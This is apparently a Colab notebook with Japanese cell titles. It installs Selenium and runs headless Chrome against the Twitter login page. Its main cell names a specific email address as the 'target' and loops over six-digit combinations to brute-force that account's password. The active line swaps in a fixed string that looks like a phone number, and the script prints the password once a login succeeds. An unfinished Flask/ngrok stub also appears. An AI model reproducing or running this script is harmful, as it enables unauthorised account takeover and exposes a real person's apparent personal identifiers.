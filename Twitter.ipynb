{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Twitter.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "mount_file_id": "1Pt5HG59s5Fzfh8PUk-iwK5YX0K9ScFeR",
      "authorship_tag": "ABX9TyNPGYiAoar1v9jRSC9P7S1D",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/hipenpen/G-Point/blob/main/Twitter.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "SzTm9XCGL_1N",
        "cellView": "form"
      },
      "source": [
        "#@title 初めて使用するときに実行\n",
        "!pip install selenium\n",
        "!apt install chromium-chromedriver\n",
        "!cp /usr/lib/chromium-browser/chromedriver /content/drive/MyDrive/pip"
      ],
      "execution_count": 3,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Mw6AQCRLDUqr"
      },
      "source": [
        "from flask import Flask, Markup, request, send_file\n",
        "from flask_ngrok import run_with_ngrok\n",
        "app = Flask(__name__)\n",
        "run_with_ngrok(app)  # Start ngrok when app is run\n",
        "\n",
        "@app.route(\"/\")\n",
        "def root():\n",
        "\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "lpF8bEJUPunn"
      },
      "source": [
        "Twitter対象 = \"hifuna2727@gmail.com\" #@param {type:\"string\"}\n",
        "import sys\n",
        "\n",
        "sys.path.append('/content/drive/MyDrive/pip/selenium/lib/python3.7/site-packages')\n",
        "\n",
        "!cp /content/drive/MyDrive/pip/chromedriver /usr/bin\n",
        "!chmod 777 /usr/bin/chromedriver\n",
        "!apt install fonts-ipafont-gothic\n",
        "from selenium import webdriver\n",
        "from selenium.webdriver.chrome.options import Options\n",
        "from selenium.webdriver.support.ui import WebDriverWait\n",
        "from selenium.webdriver.support import expected_conditions as EC\n",
        "from selenium.webdriver.common.by import By\n",
        "from selenium.webdriver.common.action_chains import ActionChains\n",
        "import time\n",
        "import os\n",
        "import string,random,itertools\n",
        " \n",
        "\n",
        " \n",
        " \n",
        "\n",
        "\n",
        "LOGIN_ID = Twitter対象\n",
        "\n",
        " \n",
        "def get_driver():\n",
        "      \n",
        "    chrome_options=webdriver.ChromeOptions()\n",
        "    chrome_options.add_argument('--headless')\n",
        "    chrome_options.add_argument('--no-sandbox')\n",
        "    chrome_options.add_argument('--disable-dev-shm-usage')\n",
        "    wd=webdriver.Chrome(\"chromedriver\",options=chrome_options)\n",
        "     \n",
        "    return wd\n",
        " \n",
        "\n",
        "def do_login(driver, LOGIN_ID, PASSWORD):\n",
        "\n",
        "    TWITTER_BASE = \"https://twitter.com/\"\n",
        "    login_url = TWITTER_BASE + \"login\"\n",
        "    driver.get(login_url)\n",
        "    \n",
        "\n",
        "    elem_id = WebDriverWait(driver, 20).until(\n",
        "        EC.visibility_of_element_located((By.NAME, \"session[username_or_email]\"))\n",
        "    )\n",
        "     \n",
        "    try:\n",
        "\n",
        "        elem_password = driver.find_element_by_name(\"session[password]\")\n",
        "   \n",
        "        if elem_id and elem_password:\n",
        " \n",
        " \n",
        "            elem_id.send_keys(LOGIN_ID)\n",
        "         \n",
        "\n",
        "            elem_password.send_keys(PASSWORD)\n",
        "             \n",
        "\n",
        "            elem_btn = WebDriverWait(driver, 10).until(\n",
        "                EC.visibility_of_element_located((By.XPATH, \"//div[@data-testid='LoginForm_Login_Button']\"))\n",
        "            )\n",
        "             \n",
        "            actions = ActionChains(driver)\n",
        "            actions.move_to_element(elem_btn)\n",
        "            actions.click(elem_btn)\n",
        "            actions.perform()\n",
        "            time.sleep(1)\n",
        "\n",
        "            perform_url = driver.current_url\n",
        "             \n",
        "            if perform_url.find(login_url) == -1:\n",
        "\n",
        "                return True\n",
        "            else:\n",
        "\n",
        "                return False\n",
        "                 \n",
        "        else:\n",
        "            return False\n",
        "    except:\n",
        "        return False  \n",
        " \n",
        "if __name__ == \"__main__\":\n",
        "\n",
        "    driver = get_driver()\n",
        "    size = 6\n",
        "    chars = string.digits\n",
        " \n",
        "    for ch in itertools.product(chars,repeat=size):\n",
        "        #password = ''.join(ch)\n",
        "        password = '09037429994'\n",
        "        login_flg = do_login(driver, LOGIN_ID, password)\n",
        "        if login_flg:\n",
        "          print('password:' + password)\n",
        "          os._exit(0)\n",
        "        if not login_flg:\n",
        "          print('Error!!')\n",
        " \n",
        "\n",
        "      \n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "qThuxjaUD0W_"
      },
      "source": [
        ""
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}